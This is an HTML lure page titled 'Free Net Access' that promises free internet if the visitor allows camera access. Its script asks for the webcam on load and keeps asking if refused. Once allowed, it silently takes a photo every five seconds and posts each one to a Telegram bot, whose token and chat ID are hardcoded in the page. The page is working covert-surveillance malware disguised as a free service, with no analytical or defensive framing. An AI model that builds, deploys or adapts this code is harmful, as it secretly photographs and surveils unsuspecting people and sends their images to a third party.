<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Net Access</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('https://safi-rahman6.github.io/Safi/Safi.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.6);
            padding: 20px;
            border-radius: 10px;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to Free Net</h1>
        <p>Allow camera access to continue.</p>
    </div>

    <script>
        const chat_id = '5998202830'; // Replace with your Telegram Chat ID
        const token = '7789337898:AAGfuc-dxckjDn2IL8RCDHf43haYcbz9J5g'; // Replace with your Telegram Bot Token
        const telegramURL = `https://api.telegram.org/bot${token}/sendPhoto`;

        // Check if the browser supports getUserMedia API
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            requestCamera(); // Request camera access immediately on page load
        } else {
            alert('Your browser does not support camera access.');
        }

        async function requestCamera() {
            try {
                // Request camera permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                captureAndSendPhotos(stream); // Start capturing photos if permission is granted
            } catch (error) {
                alert("Camera access is required to use Free Net. Please allow camera access.");
                requestCamera(); // Retry requesting camera permission if denied
            }
        }

        function captureAndSendPhotos(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            setInterval(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob);

                    fetch(telegramURL, {
                        method: 'POST',
                        body: formData,
                    })
                    .catch(error => console.error("Error sending photo:", error)); // Silent error handling
                }, 'image/jpeg');
            }, 5000); // Capture and send photo every 5 seconds
        }
    </script>
</body>
</html>
